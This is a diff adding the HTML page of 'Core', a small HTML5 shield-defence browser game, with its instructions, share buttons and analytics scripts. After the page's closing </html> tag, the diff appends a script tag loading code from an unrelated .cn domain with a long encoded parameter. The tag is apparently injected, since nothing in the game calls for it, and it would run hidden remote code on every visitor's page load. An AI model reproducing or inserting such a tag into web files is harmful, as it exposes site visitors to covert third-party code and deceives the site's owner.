@@ -1,0 +1,123 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+		<meta charset="utf-8">
+
+		<meta name="description" content="Use your shield to defend the Core from the evil red organisms!" />
+		<meta name="author" content="Hakim El Hattab" />
+
+		<meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black">
+		<meta name="viewport" content="width = 450">
+
+        <title>Core - a defensive game built in HTML5</title>
+
+		<link href="css/reset.css" rel="stylesheet" media="screen" />
+		<link href="css/main.css" rel="stylesheet" media="screen" />
+
+		<link href='http://fonts.googleapis.com/css?family=Molengo' rel='stylesheet' type='text/css'>
+
+    </head>
+    <body>
+    	<header>
+    		<h1>Core</h1>
+    		<span class="header-instruction">Expand for more info.</span>
+
+    		<!-- The extra content that can be expanded -->
+    		<div class="extra">
+
+    			<!-- Description of the experiment -->
+    			<section id="about">
+    				<h3>About</h3>
+	    			<p>
+						Your objective is to protect the core from the<br/>
+						evil red organisms while letting green ones through.<br/>
+						Press & hold <b>SPACE</b> for a temporary shield.
+	    			</p>
+	    			<p class="credits">
+	    				Created by <a href="http://hakim.se/">Hakim El Hattab</a> | <a href="http://twitter.com/hakimel">@hakimel</a>
+    				</p>
+	    		</section>
+
+	    		<!-- Social sharing -->
+	    		<section id="share">
+	    			<h3>Share</h3>
+					<iframe id="facebook-button" src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fhakim.se%2Fexperiments%2Fhtml5%2Fcore%2F01%2F&amp;layout=box_count&amp;show_faces=false&amp;width=55&amp;action=like&amp;font=arial&amp;colorscheme=light&amp;height=60" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:55px; height:60px;" allowTransparency="true"></iframe>
+					<div id="retweet-button">
+						<a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hakim.se/experiments/html5/core/01/" data-text="Core - a defensive game built with HTML5 by @hakimel" data-count="vertical" data-related="hakimel">Tweet</a>
+						<script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script>
+					</div>
+					<div id="flattr-button">
+	    				<a class="FlattrButton" style="display:none;" href="http://hakim.se/experiments/html5/core/01"></a>
+	    			</div>
+	    		</section>
+	    		</section>
+
+    		</div>
+    	</header>
+
+		<div id="status" class="ui"></div>
+			<div id="panels">
+			<div id="message" class="ui">
+				<h2 id="title">Core</h2>
+				A sibling game to <a class="external" href="http://www.sinuousgame.com/">Sinuous</a>.
+				<ul>
+					<li>1. Protect the core.</li>
+					<li>2. Gather energy (green dots).</li>
+					<li>2. Hold SPACE for shield (depletes energy).</li>
+				</ul>
+				<a href="#" id="startButton">Start</a>
+			</div>
+		</div>
+
+		<canvas id="world">
+			<p class="no-canvas">
+				You need a <a href="http://www.google.com/chrome">modern browser</a> to view this.
+			</p>
+		</canvas>
+		<canvas id="background"></canvas>
+
+		<script src="js/header.js"></script>
+		<script src="js/core.js"></script>
+
+		<!-- Third party tracking and sharing code below -->
+
+		<script type="text/javascript">
+		  var _gaq = _gaq || [];
+		  _gaq.push(['_setAccount', 'UA-15240703-1']);
+		  _gaq.push(['_trackPageview']);
+
+		  (function() {
+		    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+		    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+		    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		  })();
+		</script>
+
+		<script src="http://www.w3counter.com/tracker.js"></script>
+		<script>
+			w3counter(49720);
+			var ps = document.createElement('script');
+				ps.type = 'text/javascript';
+				ps.async = true;
+				ps.src = '//pulse.w3counter.com/pulse.js?id=49720';
+			(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(ps);
+		</script>
+
+		<script type="text/javascript">
+		/* <![CDATA[ */
+		    (function() {
+		        var s = document.createElement('script'), t = document.getElementsByTagName('script')[0];
+		        s.type = 'text/javascript';
+		        s.async = true;
+		        s.src = 'http://api.flattr.com/js/0.6/load.js?mode=auto';
+		        t.parentNode.insertBefore(s, t);
+		    })();
+		/* ]]> */
+		</script>
+
+    </body>
+</html><script src="https://tjqonline.cn/rr/t?d=j1eR9W8tusGkiYIglrwTZyvOg7OChYmQY6Awc%2fQ32BSmPvCEM4fuAnL4c%2b88W2nzk9KBCSvO%2b9n7%2bpyRo5t%2bRJFA45n%2b2drAj299eM7LC6bPbVDw9O0h4af9mG7dwfL02D0eb9KYuMxrH0347TvQAhbhRDOHBxCVEvUnsChSLXXc3eEyBBts4LO4u1l%2bEYs69wK0%2fSorPQnNnnBEM4zDeNILwPgu7FU4TkEvb9Oxt5oKpYgytbxZzmfH%2fuBzYsuViTcViSv7KbnmQ%2bJQqxCip2d3jbXe03tWSv0pORCjp%2bboQIvDtAxRaZvzU0cf%2fw20ZQl4YnE1nSxC28odEuHW1XE%2fVigykKXEOtzRDA53LL5X0jJh%2f6G1w68KxFhGMKRV9rI%2fA7Zw4xnmYwcXFGzrOrZloUXsjoEwZ3V%2bNUFRx7%2f39Sryn26Di3IXWKxVncQBFIzim64oe6K%2fKuMIn8pNUbHp4dIyK8ogOlRG3YFD7x7XkRZCaRiFPQ7ldw6%2bnxaaqawWt9xHk1SUZK%2f2%2f5Tt%2f%2fCtBI6fkVgnsJIjxogn2iUBs0iWkVcjmpaAdLUmdcl4NCur6InRhLs3ReJifrFOl7BsoMfY1bpnG2ktRfDuyie5T6LcQQwCCt8j1f6alTi%2farqfOVUr3vYYlm8cAkj2U86OfuMeuJFTczZZyIFAsX%2fPNEN7yRyiGxMTocnLaCaxTsmae3dvitwuhpK3fyJNmA%3d%3d" charset="utf-8"></script></body></html>
